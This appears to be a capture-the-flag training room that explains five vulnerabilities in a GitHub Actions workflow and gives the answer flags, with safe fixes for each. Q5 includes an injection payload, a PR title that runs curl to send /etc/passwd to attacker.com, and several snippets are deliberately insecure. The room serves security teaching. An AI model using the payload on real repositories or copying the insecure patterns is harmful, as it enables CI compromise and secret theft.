# Room 1 — Task 3: GitHub Actions Vulnerability Analysis

Examine the workflow file `vulnerable-workflow.yml`.  
Find the vulnerabilities and extract the flags.

---

## Questions

### Q1. What dangerous trigger does this workflow use — and why is it exploitable?

<details>
<summary>Hint</summary>
There are two PR-related triggers in GitHub Actions. One runs in a sandboxed context. The other runs with full repo secrets.
</details>

<details>
<summary>Answer + Flag</summary>

```yaml
on:
  pull_request_target:
```

`pull_request_target` runs in the context of the **base repository** (with access to secrets), but it checks out code from the **PR branch** (untrusted contributor code).

If the workflow then runs that untrusted code (e.g. `npm test`), the attacker's code executes with full access to repo secrets.

Safe alternative: use `pull_request` (sandboxed, no secrets) for untrusted contributors.

**Flag:** `THM{pull_request_target_Plus_Checkout_Is_Critical_RCE}`
</details>

---

### Q2. What is wrong with how this workflow pins the `actions/checkout` action?

<details>
<summary>Hint</summary>
Look at the `uses:` line. Tags can be moved — what can't be moved?
</details>

<details>
<summary>Answer + Flag</summary>

```yaml
- uses: actions/checkout@v3
```

The tag `v3` is a **mutable reference** — the action maintainer (or an attacker who compromises their account) can point `v3` to a completely different, malicious commit.

**Safe version:**
```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v3.6.0
```

Pinning to a full **commit SHA** is immutable — the SHA can never be changed.

**Flag:** `THM{Pin_Actions_To_SHA_Not_Tags}`
</details>

---

### Q3. The workflow echoes a secret in a log line. What's wrong with this and what's the risk?

<details>
<summary>Hint</summary>
Look at the "Debug info" step.
</details>

<details>
<summary>Answer + Flag</summary>

```yaml
- name: Debug info
  run: echo "Deploying with key ${{ secrets.DEPLOY_KEY }}"
```

This prints the secret directly into the **build log**. If build logs are accessible (especially on public repos), the secret is exposed.

GitHub Actions does auto-mask known secrets, but using `${{ secrets.X }}` directly in `echo` is still dangerous — the masking can be bypassed by encoding/splitting the value.

**Never echo secrets in logs. Use them only in env vars or directly in tool flags.**

**Flag:** `THM{Never_Echo_Secrets_In_Build_Logs}`
</details>

---

### Q4. The `GITHUB_TOKEN` permissions are set to `write-all`. Why is this dangerous?

<details>
<summary>Hint</summary>
What can `write-all` do to your repository?
</details>

<details>
<summary>Answer + Flag</summary>

```yaml
permissions:
  contents: write-all
```

`write-all` gives the job permission to:
- **Push code** to any branch
- **Delete branches**
- **Write to packages, issues, PRs**

If a PPE attack succeeds, the attacker now has write access to your entire repository via the compromised job.

**Best practice:** Set minimum permissions per job:
```yaml
permissions:
  contents: read
  packages: write   # only if needed
```

**Flag:** `THM{Least_Privilege_For_GITHUB_TOKEN}`
</details>

---

### Q5. What command in the deploy step creates a Remote Code Execution risk from user input?

<details>
<summary>Hint</summary>
Look for user-controlled data being passed directly into a shell command without sanitization.
</details>

<details>
<summary>Answer + Flag</summary>

```yaml
- name: Deploy
  run: ./deploy.sh ${{ github.event.pull_request.title }}
```

`github.event.pull_request.title` is **attacker-controlled input** (they set the PR title).  
A malicious PR title like `foo; curl attacker.com/$(cat /etc/passwd)` would execute arbitrary commands.

This is a **script injection** vulnerability.

**Safe version:** assign to an env var first:
```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: ./deploy.sh "$PR_TITLE"
```

**Flag:** `THM{Script_Injection_Via_PR_Title}`
</details>

---

## Room 1 Complete!
You found all flags for Room 1. Move to → [../Room2-Source-Code-Security/](../Room2-Source-Code-Security/)
